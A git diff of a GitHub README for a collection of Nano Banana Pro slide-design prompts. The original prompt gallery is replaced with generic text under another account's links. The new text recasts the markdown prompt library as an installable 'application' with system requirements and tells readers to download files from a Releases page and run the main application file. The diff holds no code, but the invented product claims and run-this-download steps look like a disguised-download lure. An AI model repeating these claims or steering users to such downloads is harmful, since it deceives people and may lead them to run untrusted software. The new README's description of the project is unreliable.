@@ -1,244 +1,82 @@
-# 🍌 Awesome Nano Banana PPT Prompts
+# 🍌 awesome-nano-banana-ppt-prompts - Effortless Presentation Creation Made Easy
 
-A curated collection of Nano Banana Pro prompts for PPT, infographics with images, multilingual support, and instant gallery preview. Open-source prompt engineering library.
+![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)
 
-## 📚 Table of Contents
+## 📋 Description
 
-- [About](#about)
-- [Prompts Gallery](#prompts-gallery)
-- [How to Use](#how-to-use)
-- [Contributing](#contributing)
-- [License](#license)
+Welcome to **awesome-nano-banana-ppt-prompts**! This open-source library provides selected Nano Banana Pro prompts tailored for PowerPoint presentations. With features such as multilingual support and instant gallery previews, you can easily create engaging infographics and slides. Enjoy a hassle-free experience in crafting visually appealing presentations.
 
-## About
+## 🚀 Getting Started
 
-This repository contains curated prompts for generating high-quality PPT slides. Each prompt includes:
-- Detailed prompt text (if the prompt text is not available, you can use [CREATE LIKE THIS](https://2slides.com/features/create-slides-like-this) feature to generate from the reference image)
-- Preview images
-- Tags for categorization
-- Contributor information
-- Usage instructions
+To start using **awesome-nano-banana-ppt-prompts**, follow these steps:
 
-## Prompts Gallery
+1. **Visit the Releases Page:** Go to our [Releases Page](https://github.com/ahmetbaldede/awesome-nano-banana-ppt-prompts/releases) to find the latest options for downloading.
+2. **Download the Application:** Select the version you want and download the files. The downloads include all the necessary prompts and resources to get you started.
+3. **Install the Application**: Simply extract the files and follow the instructions provided in the documentation.
 
-Total: **24** prompts
+## 💾 Download & Install
 
-- ### [Analog film photography aesthetic](prompts/analog-film-photography-aesthetic/prompt.md)
+To download the latest version, visit the [Releases Page](https://github.com/ahmetbaldede/awesome-nano-banana-ppt-prompts/releases) and follow these steps:
 
-  ![Preview](prompts/analog-film-photography-aesthetic/preview-1.webp)
+1. Choose the version you wish to download.
+2. Click on the appropriate file to start the download.
+3. Once downloaded, unzip the file if necessary, and look for the main application file. 
+4. Run the software to begin crafting your presentations!
 
-  **Tags:** `analog photography`, `35mm film`, `kodak portra`, `hiking life`, `film grain`
+## 🛠️ System Requirements
 
-  **Contributor:** [2slides](https://github.com/2slides)
+While the application is designed to be straightforward, here are the recommended system requirements for the best experience:
 
-- ### [Blueprint Style](prompts/blueprint-style/prompt.md)
+- **Operating System:** Windows 10 or higher, macOS 10.12 or higher
+- **Memory:** At least 4 GB RAM
+- **Storage:** 200 MB of free disk space
+- **Software:** Microsoft PowerPoint 2016 or higher
 
-  ![Preview](prompts/blueprint-style/preview-1.webp)
+These requirements will ensure that your experience running the application remains seamless.
 
-  **Tags:** `blueprint`, `engineering`
+## 🥇 Features
 
-  **Contributor:** [2slides](https://github.com/2slides)
+- **Multilingual Support:** Create presentations in various languages.
+- **Instant Gallery Preview:** View your slides as you craft them.
+- **Easy Integration:** Incorporate prompts directly into your PowerPoint presentations.
+- **Customizable Templates:** Start with various templates, fitting your needs.
+- **Engaging Infographics:** Turn your data into visually appealing graphics with ease.
 
-- ### [Christmas classic color theme and elements](prompts/christmas-classic-color-theme-and-elements/prompt.md)
+## 📂 How to Use the Prompts
 
-  ![Preview](prompts/christmas-classic-color-theme-and-elements/preview-1.webp)
+To effectively use the Nano Banana Pro prompts:
 
-  **Tags:** `classic chrismas`, `3d`
+1. **Open Your Presentation Tool:** Use Microsoft PowerPoint or any compatible software.
+2. **Import the Prompts:** Load the downloaded prompts into your software.
+3. **Select the Desired Prompt:** Choose from the available selection to start your presentation.
+4. **Edit and Customize:** Adapt the prompts and designs to suit your content and style.
 
-  **Contributor:** [2slides](https://github.com/2slides)
+## 🤝 Contributing
 
-- ### [Cute educational game map vector illustration](prompts/cute-educational-game-map-vector-illustration/prompt.md)
+We welcome any contributions to enhance the application! If you want to help:
 
-  ![Preview](prompts/cute-educational-game-map-vector-illustration/preview-1.png)
+1. Fork the repository on GitHub.
+2. Make your changes and improvements.
+3. Submit a pull request with a description of your changes.
 
-  **Tags:** `Cute educational`, `game map`, `kids`, `playful`
+Your involvement helps us improve and serve the community better.
 
-  **Contributor:** [2slides](https://github.com/2slides)
+## 📞 Support
 
-- ### [Dark data visualization dashboard style](prompts/dark-data-visualization-dashboard-style/prompt.md)
+If you encounter any issues or have questions, please contact us through the Issues section on GitHub. We strive to respond promptly and appreciate any feedback.
 
-  ![Preview](prompts/dark-data-visualization-dashboard-style/preview-1.webp)
+## 🔗 Additional Resources
 
-  **Tags:** `dark`, `data visualization`, `dashboard`
+Find more information and updates by browsing:
 
-  **Contributor:** [2slides](https://github.com/2slides)
+- [GitHub Issues](https://github.com/ahmetbaldede/awesome-nano-banana-ppt-prompts/issues)
+- [Wiki](https://github.com/ahmetbaldede/awesome-nano-banana-ppt-prompts/wiki)
+- [Documentation](https://github.com/ahmetbaldede/awesome-nano-banana-ppt-prompts/blob/main/docs/README.md)
 
-- ### [Data visualization chart key metrics style](prompts/data-visualization-chart-key-metrics-style/prompt.md)
+## 🔍 Future Updates
 
-  ![Preview](prompts/data-visualization-chart-key-metrics-style/preview-1.webp)
+Stay tuned for future updates and new features. We aim to add more prompts and tools to improve your presentation experience. Your engagement shapes the direction of this project, making it even better.
 
-  **Tags:** `data visualization`, `charts`, `key metrics`
+## 🎉 Acknowledgments
 
-  **Contributor:** [2slides](https://github.com/2slides)
-
-- ### [Egyptian theme for junior graders students](prompts/egyptian-theme-for-junior-graders-students/prompt.md)
-
-  ![Preview](prompts/egyptian-theme-for-junior-graders-students/preview-1.webp)
-
-  **Tags:** `Egyptian`, `education`, `student`, `junior graders`
-
-  **Contributor:** [2slides](https://github.com/2slides)
-
-- ### [IBM style with the modern "IBM Carbon" style](prompts/ibm-style-with-the-modern-ibm-carbon-style/prompt.md)
-
-  ![Preview](prompts/ibm-style-with-the-modern-ibm-carbon-style/preview-1.webp)
-
-  **Tags:** `IBM style`, `IBM Carbon design`
-
-  **Contributor:** [2slides](https://github.com/2slides)
-
-- ### [IBM style with the "Paul Rand" heritage look](prompts/ibm-style-with-the-paul-rand-heritage-look/prompt.md)
-
-  ![Preview](prompts/ibm-style-with-the-paul-rand-heritage-look/preview-1.webp)
-
-  **Tags:** `ibm style`, `Paul Rand`, `heritage`
-
-  **Contributor:** [2slides](https://github.com/2slides)
-
-- ### [Luxury Vintage Christmas](prompts/luxury-vintage-christmas/prompt.md)
-
-  ![Preview](prompts/luxury-vintage-christmas/preview-1.webp)
-
-  **Tags:** `Luxury`, `Vintage`, `Christmas`
-
-  **Contributor:** [2slides](https://github.com/2slides)
-
-- ### [McKinsey & Company presentation style](prompts/mckinsey-company-presentation-style/prompt.md)
-
-  ![Preview](prompts/mckinsey-company-presentation-style/preview-1.webp)
-
-  **Tags:** `McKinsey`, `consultant`, `business`
-
-  **Contributor:** [2slides](https://github.com/2slides)
-
-- ### [Modern Minimalist Christmas](prompts/modern-minimalist-christmas/prompt.md)
-
-  ![Preview](prompts/modern-minimalist-christmas/preview-1.webp)
-
-  **Tags:** `Christmas`, `Modern`, `Minimalist`
-
-  **Contributor:** [2slides](https://github.com/2slides)
-
-- ### [Moody outdoor photography](prompts/moody-outdoor-photography/prompt.md)
-
-  ![Preview](prompts/moody-outdoor-photography/preview-1.webp)
-
-  **Tags:** `moody photography`, `foggy forest`, `silhouette`
-
-  **Contributor:** [2slides](https://github.com/2slides)
-
-- ### [Product launch deck in Apple-style minimalism](prompts/product-launch-deck-in-apple-style-minimalism/prompt.md)
-
-  ![Preview](prompts/product-launch-deck-in-apple-style-minimalism/preview-1.jpg)
-
-  **Tags:** `apple`, `product launch`
-
-  **Contributor:** [2slides](https://github.com/2slides)
-
-- ### [SaaS dashboard style](prompts/saas-dashboard-style/prompt.md)
-
-  ![Preview](prompts/saas-dashboard-style/preview-1.webp)
-
-  **Tags:** `dashboard`, `key metrics`, `visual graph`, `charts`
-
-  **Contributor:** [2slides](https://github.com/2slides)
-
-- ### [Saul Bass style with the classic "Anatomy of a Murder" Look](prompts/saul-bass-style-with-the-classic-anatomy-of-a-murder-look/prompt.md)
-
-  ![Preview](prompts/saul-bass-style-with-the-classic-anatomy-of-a-murder-look/preview-1.webp)
-
-  **Tags:** `Saul Bass`, `Anatomy of a Murder`
-
-  **Contributor:** [2slides](https://github.com/2slides)
-
-- ### [Saul Bass style with the "corporate/network" geometric look](prompts/saul-bass-style-with-the-corporate-network-geometric-look/prompt.md)
-
-  ![Preview](prompts/saul-bass-style-with-the-corporate-network-geometric-look/preview-1.webp)
-
-  **Tags:** `Saul Bass`, `corporate`, `geometric`
-
-  **Contributor:** [2slides](https://github.com/2slides)
-
-- ### [Saul Bass style with "title sequence" narrative style](prompts/saul-bass-style-with-title-sequence-narrative-style/prompt.md)
-
-  ![Preview](prompts/saul-bass-style-with-title-sequence-narrative-style/preview-1.webp)
-
-  **Tags:** `Saul Bass`, `title sequence`, `narrative`
-
-  **Contributor:** [2slides](https://github.com/2slides)
-
-- ### [Stylized architectural blueprint concept art](prompts/stylized-architectural-blueprint-concept-art/prompt.md)
-
-  ![Preview](prompts/stylized-architectural-blueprint-concept-art/preview-1.png)
-
-  **Tags:** `Blue-Line Concept`, `Blueprint`, `Pixar-style Storyboard`
-
-  **Contributor:** [2slides](https://github.com/2slides)
-
-- ### [Travel journal collage](prompts/travel-journal-collage/prompt.md)
-
-  ![Preview](prompts/travel-journal-collage/preview-1.webp)
-
-  **Tags:** `travel journal`, `mixed media`, `collage art`, `polaroid`, `road trip`, `hand written`, `scrapbooking`
-
-  **Contributor:** [2slides](https://github.com/2slides)
-
-- ### [Vintage architectural cross-section watercolor illustration](prompts/vintage-architectural-cross-section-watercolor-illustration/prompt.md)
-
-  ![Preview](prompts/vintage-architectural-cross-section-watercolor-illustration/preview-1.png)
-
-  **Tags:** `Vintage architectural`, `cross-section`, `watercolor illustration`
-
-  **Contributor:** [2slides](https://github.com/2slides)
-
-- ### [Whimsical 3D isometric Christmas](prompts/whimsical-3d-isometric-christmas/prompt.md)
-
-  ![Preview](prompts/whimsical-3d-isometric-christmas/preview-1.webp)
-
-  **Tags:** `Whimsical`, `3D`, `Christmas`
-
-  **Contributor:** [2slides](https://github.com/2slides)
-
-- ### [Whiteboard data analysis sketch style](prompts/whiteboard-data-analysis-sketch-style/prompt.md)
-
-  ![Preview](prompts/whiteboard-data-analysis-sketch-style/preview-1.webp)
-
-  **Tags:** `whiteboard`, `data analysis`, `sketch`
-
-  **Contributor:** [2slides](https://github.com/2slides)
-
-- ### [WPA National Park poster style](prompts/wpa-national-park-poster-style/prompt.md)
-
-  ![Preview](prompts/wpa-national-park-poster-style/preview-1.webp)
-
-  **Tags:** `WPA poster`, `national park poster`, `vintage travel`, `mountain landscape`, `flat design`, `retro poster`
-
-  **Contributor:** [2slides](https://github.com/2slides)
-
-## How to Use
-
-1. Browse the prompts gallery above
-2. Click on a prompt to view details
-3. Copy the prompt text
-4. Use it in [2Slides](https://2slides.com)
-
-## Contributing
-
-We welcome community contributions! Please refer to [CONTRIBUTING.md](.github/CONTRIBUTING.md) for guidelines.
-
-### Contribution Process
-
-1. Fork this repository
-2. Create a new prompt directory and files
-3. Submit a Pull Request
-4. Wait for review and merge
-
-## License
-
-This project is licensed under the Apache-2.0 License. See the [LICENSE](LICENSE) file for details.
-
----
-
-⭐ If this project helps you, please give us a Star!
-
-<!-- This README is auto-generated. Run `node scripts/generate-readme-from-github.js` to regenerate. -->
+Thank you for using **awesome-nano-banana-ppt-prompts**. We are excited to see what presentations you create!
